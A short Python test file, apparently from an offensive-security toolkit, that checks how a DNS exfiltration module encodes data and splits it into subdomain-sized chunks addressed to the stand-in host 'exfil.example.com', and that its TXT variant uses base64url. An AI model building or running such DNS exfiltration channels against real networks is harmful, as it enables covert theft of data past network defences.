#!/usr/bin/env python3
"""
DNS 外泄编码与切分测试
"""

from core.exfiltration.base import ExfilConfig, ExfilChannel
from core.exfiltration.channels.dns import DNSExfiltration, DNSExfiltrationTXT


def test_dns_split_respects_label_and_name_length():
    config = ExfilConfig(
        channel=ExfilChannel.DNS,
        destination="exfil.example.com",
        dns_subdomain_length=20,
    )
    module = DNSExfiltration(config)
    module._domain = "exfil.example.com"
    module._transfer_id = "abcd1234"
    module._chunk_id = 1

    encoded = module._encode_payload(b"a" * 200)
    chunks = list(module._split_encoded(encoded))

    assert chunks
    for seq, chunk in chunks:
        assert len(chunk) <= config.dns_subdomain_length
        query_name = module._build_query_name(chunk, seq)
        assert len(query_name) <= module.MAX_NAME_LENGTH


def test_dns_txt_uses_base64url():
    config = ExfilConfig(
        channel=ExfilChannel.DNS,
        destination="exfil.example.com",
    )
    module = DNSExfiltrationTXT(config)
    encoded = module._encode_payload(b"hello-world")

    assert "=" not in encoded
    assert "\n" not in encoded
